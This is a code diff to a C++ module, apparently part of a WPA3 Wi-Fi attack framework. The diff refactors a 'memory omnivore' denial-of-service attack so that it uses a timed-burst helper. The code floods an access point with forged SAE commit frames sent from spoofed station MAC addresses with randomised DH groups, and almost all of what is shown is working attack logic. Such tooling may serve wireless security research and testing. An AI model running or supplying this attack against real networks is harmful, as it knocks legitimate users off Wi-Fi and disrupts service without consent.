@@ -1,12 +1,13 @@
 #include "attacks/DoS_hard/memory_omnivore/memory_omnivore.h"
 
-#include <tins/tins.h>
-#include <thread>
 #include <chrono>
 #include <random>
 #include <stdexcept>
-#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
+#include <thread>
+#include <tins/tins.h>
+
 #include "attacks/DoS_hard/dos_helpers.h"
+#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
 #include "config/RunStatus.h"
 #include "ex_program/external_actors/ExternalConn.h"
 #include "logger/log.h"
@@ -107,32 +108,15 @@ void run_attack(RunStatus &rs){
 	rs.start_observers();
 	log(LogLevel::INFO, "Attack started");
 
-	long long total_sent = 0;
-	long long next_log = 0;
-	const auto end_time = steady_clock::now() + seconds(attack_time);
+	size_t mac_idx = 0;
+	dos_helpers::timed_burst(sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL,
+	[&]() -> optional<RadioTap>{
+		const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
+		++mac_idx;
+		sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
+		return make_sae_commit(ap_mac, sta_mac, sae_params.value());
+	});
 
-	// TODO same
-	while(steady_clock::now() < end_time){
-		for(const auto &sta_mac: mac_pool){
-			//if(steady_clock::now() >= end_time) break;
-
-			sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
-
-			auto frame = make_sae_commit(ap_mac, sta_mac, sae_params.value());
-			for(int i = 0; i < burst_size; ++i){
-				sender.send(frame);
-				this_thread::sleep_for(nanoseconds(100));
-			}
-			total_sent += burst_size;
-		}
-
-		if(total_sent >= next_log){
-			log(LogLevel::DEBUG, "Packets sent: %lld", total_sent);
-			next_log += 10000;
-		}
-	}
-
-	log(LogLevel::INFO, "Done. Total packets sent: %lld", total_sent);
 	ap->conn->disconnect();
 }
 
